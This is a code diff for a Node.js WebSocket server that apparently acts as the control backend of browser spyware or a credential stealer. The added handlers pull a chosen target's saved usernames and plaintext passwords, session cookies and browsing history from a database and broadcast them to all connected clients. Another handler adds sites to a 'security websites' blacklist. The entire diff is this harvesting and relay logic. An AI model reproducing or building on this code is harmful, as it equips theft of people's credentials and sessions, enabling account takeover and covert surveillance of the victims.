@@ -118,7 +118,7 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
                 wss.broadcast(JSON.stringify(jsonObj));
             });
         }
-        else if (type=='cookie'){
+        else if (type=='cookie'){//insert cookie
             data = JSON.parse(message);
             console.log(data);
             var site = data.website;
@@ -138,8 +138,64 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             database.updateCookies(json);
             //message.forEach();
         }
-        else if (type=='getLoginInfo'){
+
+        else if (type=='getLoginInfo'){//get logins for 1 client
+            var targetID = data.targetID;
+            console.log("getting login info for "+targetID);
+            database.getLoginInfo(targetID, function(loginJSON){
+                //console.log(userStatus);
+                console.log("sending login list for "+targetID);
+                var domainArr=[];
+                var usernameArr=[];
+                var passwordArr=[];
+                loginJSON.forEach(function each(entry) {
+                    domainArr.push(entry.URL);
+                    usernameArr.push(entry.Username);
+                    passwordArr.push(entry.UserPassword);
+                });
+                var json = {id:'0',targetID:targetID,type:'loginID',domain:domainArr,username:usernameArr,password:passwordArr};
+                wss.broadcast(JSON.stringify(json));
+            });
             
+        }
+        else if (type=='list'){//add to blacklist
+            var url =data.addString;
+            database.updateSecurityWebsites(url);
+            var json={id:"0",type:"listAdd",addString:url};
+            wss.broadcast(JSON.stringify(json));
+        }
+        else if (type=='getHistory'){//get history for id
+            var targetID = data.targetID;
+            console.log("getting history for "+targetID);
+            database.getHistory(targetID,function(historyJSON){
+                var historyArr=[];
+                historyJSON.forEach(function each(entry) {
+                    historyArr.push(entry.URL);
+                });
+                var json = {id:'0',targetID:targetID,type:'idHistory',history:historyArr};
+                //console.log(json);
+                wss.broadcast(JSON.stringify(json));
+                console.log("history sent");
+            });
+        }
+        else if (type=='getCookies'){//get cookies for single user
+            var targetID = data.targetID;
+            console.log("getting cookies for "+targetID);
+            database.getCookies(targetID,function(cookieJSON){
+                var domainArr=[];
+                var cookieNameArr=[];
+                var cookieValueArr=[];
+                cookieJSON.forEach(function each(entry) {
+                    domainArr.push(entry.Domain);
+                    cookieNameArr.push(entry.Name);
+                    cookieValueArr.push(entry.Value);
+                });
+                var json = {id:'0',targetID:targetID,type:'cookieID',nameArr:cookieNameArr,valueArr:cookieValueArr,domainArr:domainArr};
+                //console.log(json);
+                wss.broadcast(JSON.stringify(json));
+                console.log("cookies sent");
+            });
+
         }
         //SENDING DATA
         wss.broadcast(message);
